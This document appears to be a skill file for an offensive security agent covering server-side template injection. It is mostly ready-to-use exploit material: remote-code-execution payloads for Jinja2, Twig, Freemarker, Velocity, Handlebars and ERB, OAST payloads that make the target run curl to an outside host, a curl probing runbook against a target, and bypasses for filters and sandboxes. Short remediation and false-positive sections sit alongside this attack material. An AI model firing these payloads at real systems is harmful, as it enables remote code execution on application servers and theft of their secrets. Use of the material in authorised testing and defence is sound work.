---
name: ssti
description: Server-side template injection across Jinja2 / Twig / Freemarker / Velocity / Handlebars / ERB / Liquid
triggers: [ssti, template injection, jinja, twig, freemarker, velocity, mustache, erb, handlebars, render]
---

# Server-Side Template Injection (SSTI)

When user input is concatenated into a template string and the template engine evaluates expressions in that string, the engine becomes an attacker-controlled scripting environment. Most modern engines run on top of the language runtime (Jinja2 → Python, Freemarker → JVM, ERB → Ruby), so SSTI usually pivots to RCE.

CWE-1336; not in OWASP Top 10 explicitly but always in the top-10 "most fun" classes. Companion to `scan_ssti`.

## Attack Surface

**Engines + their host languages**
- **Jinja2 / Mako** → Python. The classic. Web frameworks: Flask, Django (with `jinja2` extension), FastAPI templates.
- **Twig** → PHP. Symfony, Drupal 8+, modern Laravel optional.
- **Freemarker** → JVM. Spring MVC, Apache OFBiz.
- **Velocity** → JVM. Apache, Confluence (deprecated but lingering).
- **Handlebars / Mustache** → JS (Node). Sandbox-vulnerable variants in older versions.
- **ERB** → Ruby. Rails (when `render inline:` is used incautiously).
- **Liquid** → Ruby. Shopify and clones. Sandboxed by default; misconfig possible.
- **Smarty** → PHP. Older PHP apps.
- **Razor (.cshtml)** → .NET. Limited SSTI scope; usually compile-time-checked.
- **Pug (Jade)** → JS. Older Express apps.

**Where to look**
- Email-template editors where users supply subject/body
- "Personalized message" features (`Hello {{ user.name }}`)
- PDF / report generators that render templates with user-controlled fragments
- Error pages that render user input verbatim into a template
- Admin "system messages" / banner editors
- Liquid / Shopify-style storefront template editors
- CMS "code blocks" / "raw HTML" features when proxied through a template engine

## Detection Channels

### Step-1 polyglot probe
Try this exact string in every text field, log entry, and URL parameter:

```
${{<%[%'"}}%\.
```

Errors of different shapes per engine:
- Jinja2 / Mako: `jinja2.exceptions.TemplateSyntaxError` / `MakoSyntaxError`
- Twig: `Twig\Error\Syntax`
- Freemarker: `freemarker.core.ParseException`
- ERB: `SyntaxError: (erb):...`
- Handlebars: `Parse error on line ...`

Different error → different engine → tailored payload.

### Engine fingerprint via math
- Jinja2: `{{ 7*7 }}` → `49`
- Twig: `{{ 7*'7' }}` → `49`
- Freemarker: `${7*7}` → `49`
- Velocity: `#set($x=7*7)$x` → `49`
- ERB: `<%= 7*7 %>` → `49`
- Handlebars: `{{#with "s" as |string|}}{{this}}{{/with}}` → `s` (no math, but identifies)
- Mustache: pure logic-less; SSTI rarely applicable

### OAST confirmation
Once an engine is identified, fire a DNS callback via the engine's runtime — confirms code execution without committing to a shell.

## Engine-Specific Payloads

### Jinja2 (Python — Flask / FastAPI)

**OAST**
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[349]('curl http://oast.fun/jinja',shell=True,stdout=-1).communicate() }}
```
(Index `349` is `subprocess.Popen`; find with `{{ ''.__class__.__mro__[1].__subclasses__() | length }}` then iterate.)

**RCE (one-liner)**
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**RCE (config leak — when subprocess class is unreachable)**
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig (PHP — Symfony, Drupal)

**RCE**
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

**Newer Twig (no `_self` env access)**
```twig
{{['id']|filter('system')}}
```

### Freemarker (JVM — Spring, OFBiz)

**OAST**
```freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${ x("curl http://oast.fun/fm") }
```

**RCE one-liner**
```freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
```

### Velocity (JVM — Apache, Confluence)

**RCE**
```velocity
#set($e="exp")
#set($exec = $e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))
```

Or Confluence-pattern (CVE-2021-26084 era):
```velocity
'%2B#{Runtime.getRuntime().exec("id")}%2B'
```

### Handlebars (JS — Node)

**Old (pre-4.0)**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}
        {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

(Long. Easier to upgrade to Handlebars 4.x in defence; in offence, use the canonical PoC and move on.)

### ERB (Ruby — Rails inline render)

```erb
<%= `id` %>
<%= system('id') %>
```

When `render inline:` accepts a user string: instant RCE.

### Liquid (Ruby — Shopify, Jekyll)

Liquid is sandboxed by default. SSTI is usually limited to information disclosure of context variables:
```liquid
{{ shop.metafields.private }}
```

When `Liquid::Template.parse(..., environment: ...)` is called with a custom env exposing dangerous tags: RCE possible. Rare.

## Operational Runbook

### Step 1 — polyglot probe
```bash
# Fire across all known input fields
PROBE='${{<%[%'"'"'\.'
curl -sG "<TARGET>" --data-urlencode "name=$PROBE"
curl -sG "<TARGET>" --data-urlencode "subject=$PROBE"
curl -sG "<TARGET>" --data-urlencode "message=$PROBE"
```

### Step 2 — fingerprint
```bash
# Confirm engine — try each math probe; the one that reflects `49` wins
for probe in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#set($x=7*7)$x'; do
  echo "Probe: $probe"
  curl -s "<TARGET>" --data-urlencode "field=$probe" | grep -oE '\b49\b'
done
```

### Step 3 — OAST callback
Per engine table above. Confirm via interactsh / Burp Collaborator log.

### Step 4 — RCE escalation (scope-permitting)
Per engine table. Spawn a reverse shell ONLY in authorised engagement scope.

## Bypass Techniques

- **Filter banning `{{` / `}}`**: try `{%- if ... %}` Jinja statement syntax or `{{(7*7)|attr('__class__')}}`.
- **Sandboxed Jinja**: escape via `lipsum.__globals__.os.popen` or `cycler.next.__globals__`.
- **Twig with disabled `_self`**: use `|filter('system')` or `|map('system')`.
- **Length limits**: chain short payloads via concatenation, or use `request.args.cmd` (Flask) to pass the actual command externally.
- **Allowlist of filters**: many filter functions (`map`, `filter`, `reduce`) accept a function name and reflect.

## Validation

1. OAST DNS/HTTP fires from the server — confirms engine executed the payload.
2. Reflect a deterministic computation (`{{7*7}}` → 49) to prove evaluation occurred.
3. Read a benign env var or file path to demonstrate runtime access.
4. For RCE-class evidence, capture `id; hostname; whoami` output (or via OAST exfil).
5. Document: engine, version (when available), exact payload, response shape.

## False Positives

- **Client-side templating** (Handlebars / Mustache rendered in-browser) — not SSTI. Test by checking whether the response *contains* the template string verbatim or the *evaluated* result. If you see literal `{{7*7}}` in the body but the rendered page shows `49`, the engine is client-side.
- **Reflected XSS that looks like SSTI** — if `{{<script>}}` reflects but `{{7*7}}` doesn't compute, you've got XSS, not SSTI.
- **Logic-less templates with no eval** (Mustache strict mode) — no SSTI surface.

## Impact

- RCE on the app server in the language runtime — Python / JVM / Ruby / Node / PHP.
- Read every env var, secret, file path the process can see.
- Pivot to cloud metadata, internal services, downstream queues.
- Read the template source code itself + the framework's database connection — usually has the keys to everything.

## Remediation

1. Don't allow user input into template *strings*. Pass user input as *data* to a pre-compiled template.
2. When user-supplied templates are a feature (Shopify-style storefront editors), use a sandboxed engine (Liquid, JTwig, Velocity-Tools) with a strict allow-list of tags and filters.
3. Upgrade old engines (Handlebars < 4, Twig < 2, Velocity < 2.0) — known SSTI bypasses exist in older versions.
4. Disable `render inline:` in Rails / Django; require pre-compiled templates.
5. Don't expose the framework's class-tree via `__class__` / `__globals__` — sandbox engines like Jinja2 have `SandboxedEnvironment` for this.

## Pro Tips

1. The polyglot probe `${{<%[%'"}}%\.` is the fastest way to fingerprint — every engine error-classes differently.
2. Always confirm with `{{7*7}}` style math before launching RCE payloads — saves time when the field is just XSS-able, not SSTI.
3. Email subject lines and PDF report generators are the highest-yield surfaces — most apps forget those routes pass through a template.
4. Use OAST as the safe confirmation primitive; don't pop a shell on the first hit.
5. Drop into the framework's debugger if it's exposed — Flask's `/console` in debug mode is the Holy Grail (also CWE-489).

## Summary

SSTI converts a templating engine into a scripting environment. Detect with the polyglot probe; fingerprint with math; confirm with OAST; escalate per engine. Most SSTI ends in RCE on the application host.
